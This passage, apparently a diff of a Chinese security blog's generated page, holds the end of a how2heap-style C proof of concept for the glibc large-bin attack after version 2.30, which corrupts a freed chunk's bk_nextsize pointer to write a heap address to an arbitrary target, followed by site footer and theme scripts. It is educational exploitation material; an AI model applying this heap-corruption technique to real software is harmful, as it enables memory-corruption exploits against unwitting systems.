class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Since glibc2.30, two new checks have been enforced on large bin chunk insertion\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Check 1 : \n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;    if (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;        malloc_printerr (\&quot;malloc(): largebin double linked list corrupted (nextsize)\&quot;);\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Check 2 : \n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;    if (bck-&gt;fd != fwd)\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;        malloc_printerr (\&quot;malloc(): largebin double linked list corrupted (bk)\&quot;);\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;This prevents the traditional large bin attack\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;However, there is still one possible path to trigger large bin attack. The PoC is shown below : \n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;====================================================================\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> target = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Here is the target we want to overwrite (%p) : %lu\n\n&quot;</span>,&amp;target,target);</span><br><span class="line">  <span class="type">size_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x428</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;First, we allocate a large chunk [p1] (%p)\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="type">size_t</span> *g1 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;And another chunk to prevent consolidate\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;We also allocate a second large chunk [p2]  (%p).\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;This chunk should be smaller than [p1] and belong to the same large bin.\n&quot;</span>);</span><br><span class="line">  <span class="type">size_t</span> *g2 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Once again, allocate a guard chunk to prevent consolidate\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Free the larger of the two --&gt; [p1] (%p)\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="type">size_t</span> *g3 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Allocate a chunk larger than [p1] to insert [p1] into large bin\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(p2);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Free the smaller of the two --&gt; [p2] (%p)\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;At this point, we have one chunk in large bin [p1] (%p),\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;               and one chunk in unsorted bin [p2] (%p)\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  p1[<span class="number">3</span>] = (<span class="type">size_t</span>)((&amp;target)<span class="number">-4</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Now modify the p1-&gt;bk_nextsize to [target-0x20] (%p)\n&quot;</span>,(&amp;target)<span class="number">-4</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> *g4 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Finally, allocate another chunk larger than [p2] (%p) to place [p2] (%p) into large bin\n&quot;</span>, p2<span class="number">-2</span>, p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Since glibc does not check chunk-&gt;bk_nextsize if the new inserted chunk is smaller than smallest,\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;  the modified p1-&gt;bk_nextsize does not trigger any error\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Upon inserting [p2] (%p) into largebin, [p1](%p)-&gt;bk_nextsize-&gt;fd-&gt;nexsize is overwritten to address of [p2] (%p)\n&quot;</span>, p2<span class="number">-2</span>, p1<span class="number">-2</span>, p2<span class="number">-2</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;In out case here, target is now overwritten to address of [p2] (%p), [target] (%p)\n&quot;</span>, p2<span class="number">-2</span>, (<span class="type">void</span> *)target);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Target (%p) : %p\n&quot;</span>,&amp;target,(<span class="type">size_t</span>*)target);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;====================================================================\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  assert((<span class="type">size_t</span>)(p2<span class="number">-2</span>) == target);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://gxher.github.io">gxh</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://gxher.github.io/2022/07/01/Large_ubsorted/">http://gxher.github.io/2022/07/01/Large_ubsorted/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://gxher.github.io" target="_blank">gxh's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/gxher/blog-img/6.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/07/10/glibc%E7%89%88%E6%9C%AC%E6%9B%B4%E6%96%B0%E7%9A%84%E4%B8%80%E4%BA%9B%E5%8F%98%E5%8A%A8/"><img class="prev-cover" src="/img/loading.gif" data-original="https://cdn.jsdelivr.net/gh/gxher/blog-img/6.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">GLIBC版本更新的一些变动</div></div></a></div><div class="next-post pull-right"><a href="/2022/07/01/armpwn%E5%85%A5%E9%97%A8/"><img class="next-cover" src="/img/loading.gif" data-original="https://cdn.jsdelivr.net/gh/gxher/blog-img/1 (1).jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">ARMPWN入门</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/loading.gif" data-original="https://cdn.jsdelivr.net/gh/gxher/blog-img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">gxh</div><div class="author-info__description">一个无聊到爆炸的人</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">7</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">爱生活，爱奥奥</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#unsorted-bin-attack"><span class="toc-number">1.</span> <span class="toc-text">unsorted_bin attack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#large-bin-attack"><span class="toc-number">2.</span> <span class="toc-text">large_bin attack</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%B3%E8%AF%B7%E6%97%B6%E5%88%A9%E7%94%A8%EF%BC%9A"><span class="toc-number">2.1.</span> <span class="toc-text">申请时利用：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%92%E5%85%A5%E6%97%B6%E5%88%A9%E7%94%A8%EF%BC%88%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99%E5%85%A5%E5%A0%86%E5%9C%B0%E5%9D%80%EF%BC%89"><span class="toc-number">2.2.</span> <span class="toc-text">插入时利用（任意地址写入堆地址）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#libc2-31%E5%90%8E%E7%9A%84large-bin-attack"><span class="toc-number">3.</span> <span class="toc-text">libc2.31后的large_bin attack</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#how-to-heap"><span class="toc-number">3.1.</span> <span class="toc-text">how to heap</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/07/20/%E8%93%9D%E5%B8%BD%E6%9D%AFwp/" title="2022蓝帽杯 初赛pwn wp及其复现"><img src="/img/loading.gif" data-original="/%5Bobject%20Object%5D" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2022蓝帽杯 初赛pwn wp及其复现"/></a><div class="content"><a class="title" href="/2022/07/20/%E8%93%9D%E5%B8%BD%E6%9D%AFwp/" title="2022蓝帽杯 初赛pwn wp及其复现">2022蓝帽杯 初赛pwn wp及其复现</a><time datetime="2022-07-20T14:40:04.034Z" title="发表于 2022-07-20 22:40:04">2022-07-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/07/10/glibc%E7%89%88%E6%9C%AC%E6%9B%B4%E6%96%B0%E7%9A%84%E4%B8%80%E4%BA%9B%E5%8F%98%E5%8A%A8/" title="GLIBC版本更新的一些变动"><img src="/img/loading.gif" data-original="https://cdn.jsdelivr.net/gh/gxher/blog-img/6.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="GLIBC版本更新的一些变动"/></a><div class="content"><a class="title" href="/2022/07/10/glibc%E7%89%88%E6%9C%AC%E6%9B%B4%E6%96%B0%E7%9A%84%E4%B8%80%E4%BA%9B%E5%8F%98%E5%8A%A8/" title="GLIBC版本更新的一些变动">GLIBC版本更新的一些变动</a><time datetime="2022-07-10T15:53:24.117Z" title="发表于 2022-07-10 23:53:24">2022-07-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/07/01/Large_ubsorted/" title="任意地址写较大数总结"><img src="/img/loading.gif" data-original="https://cdn.jsdelivr.net/gh/gxher/blog-img/6.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="任意地址写较大数总结"/></a><div class="content"><a class="title" href="/2022/07/01/Large_ubsorted/" title="任意地址写较大数总结">任意地址写较大数总结</a><time datetime="2022-07-01T10:30:16.240Z" title="发表于 2022-07-01 18:30:16">2022-07-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/07/01/armpwn%E5%85%A5%E9%97%A8/" title="ARMPWN入门"><img src="/img/loading.gif" data-original="https://cdn.jsdelivr.net/gh/gxher/blog-img/1 (1).jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ARMPWN入门"/></a><div class="content"><a class="title" href="/2022/07/01/armpwn%E5%85%A5%E9%97%A8/" title="ARMPWN入门">ARMPWN入门</a><time datetime="2022-07-01T10:30:09.894Z" title="发表于 2022-07-01 18:30:09">2022-07-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/06/24/2.23GLIBC%E5%86%85%E5%AD%98%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/" title="GLIBC2.23内存源码分析"><img src="/img/loading.gif" data-original="https://cdn.jsdelivr.net/gh/gxher/blog-img/4.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="GLIBC2.23内存源码分析"/></a><div class="content"><a class="title" href="/2022/06/24/2.23GLIBC%E5%86%85%E5%AD%98%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/" title="GLIBC2.23内存源码分析">GLIBC2.23内存源码分析</a><time datetime="2022-06-24T05:08:16.366Z" title="发表于 2022-06-24 13:08:16">2022-06-24</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By gxh</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div>
+        <style>
+            [bg-lazy] {
+                background-image: none !important;
+                background-color: #eee !important;
             }
-          });
-          clipboard.on('success', function(e) {
-            e.clearSelection();
-            e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-copy', 'icon-success');
-            setTimeout(function() {
-              e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-success', 'icon-copy');
-            }, 2000);
-          });
-        });
-      }
-    });
-  })();
-</script>
-
-
-  
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
-    window.anchors.options = {
-      placement: CONFIG.anchorjs.placement,
-      visible  : CONFIG.anchorjs.visible
-    };
-    if (CONFIG.anchorjs.icon) {
-      window.anchors.options.icon = CONFIG.anchorjs.icon;
-    }
-    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
-    var res = [];
-    for (var item of el) {
-      res.push('.markdown-body > ' + item.trim());
-    }
-    if (CONFIG.anchorjs.placement === 'left') {
-      window.anchors.options.class = 'anchorjs-link-left';
-    }
-    window.anchors.add(res.join(', '));
-  });
-</script>
-
-
-  
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
-    Fluid.plugins.fancyBox();
-  });
-</script>
-
-
-  <script>Fluid.plugins.imageCaption();</script>
-
-  <script  src="/js/local-search.js" ></script>
-
-
-
-
-
-<!-- 主题的启动项，将它保持在最底部 -->
-<!-- the boot of the theme, keep it at the bottom -->
-<script  src="/js/boot.js" ></script>
-
-
-  
-
-  <noscript>
-    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
-  </noscript>
-</body>
-</html>
+        </style>
+        <script>
+            window.imageLazyLoadSetting = {
+                isSPA: false,
+                preloadRatio: 1,
+                processImages: null,
+            };
+        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script>!function(e){e.imageLazyLoadSetting.processImages=t;var n=e.imageLazyLoadSetting.isSPA,i=e.imageLazyLoadSetting.preloadRatio||1,r=o();function o(){var t=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")),e=Array.prototype.slice.call(document.querySelectorAll("[bg-lazy]"));return t.concat(e)}function t(){n&&(r=o());for(var t,a=0;a<r.length;a++)0<=(t=(t=r[a]).getBoundingClientRect()).bottom&&0<=t.left&&t.top<=(e.innerHeight*i||document.documentElement.clientHeight*i)&&function(){var t,e,n,i,o=r[a];e=function(){r=r.filter(function(t){return o!==t})},(t=o).hasAttribute("bg-lazy")?(t.removeAttribute("bg-lazy"),e&&e()):(n=new Image,i=t.getAttribute("data-original"),n.onload=function(){t.src=i,t.removeAttribute("data-original"),e&&e()},t.src!==i&&(n.src=i))}()}function a(){clearTimeout(t.tId),t.tId=setTimeout(t,500)}t(),document.addEventListener("scroll",a),e.addEventListener("resize",a),e.addEventListener("orientationchange",a)}(this);</script></body></html>
